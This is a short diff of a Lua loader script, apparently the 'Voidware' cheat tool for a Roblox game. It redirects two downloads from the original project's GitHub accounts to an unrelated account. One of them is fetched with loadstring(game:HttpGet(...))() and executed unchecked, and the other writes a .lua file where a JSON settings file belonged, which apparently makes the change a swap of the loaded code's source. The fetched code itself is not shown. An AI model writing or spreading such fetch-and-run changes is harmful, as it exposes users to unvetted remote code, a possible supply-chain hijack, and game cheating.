@@ -33,7 +33,7 @@ pcall(function()
     if isNew then
         writefile("voidware_linoria/themes/default.txt", "Jester")
         local suc = pcall(function()
-            writefile("voidware_linoria/ink_game/settings/default.json", game:HttpGet("https://raw.githubusercontent.com/Erchobg/VoidwareProfiles/refs/heads/main/InkGame/ink_game/settings/default.json", true))
+            writefile("voidware_linoria/ink_game/settings/default.json", game:HttpGet("https://raw.githubusercontent.com/nbdcLdheb/Jelsllsjr/refs/heads/main/Settings.lua", true))
         end)
         if suc then
             writefile("voidware_linoria/ink_game/settings/autoload.txt", "default")
@@ -46,7 +46,7 @@ task.spawn(function()
         if not isfile("Local_VW_Update_Log.json") then
             shared.UpdateLogBypass = true
         end
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/VWUpdateLog.lua", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/nbdcLdheb/Jelsllsjr/refs/heads/main/notificationSys.lua", true))()
         shared.UpdateLogBypass = nil
     end)
 end)
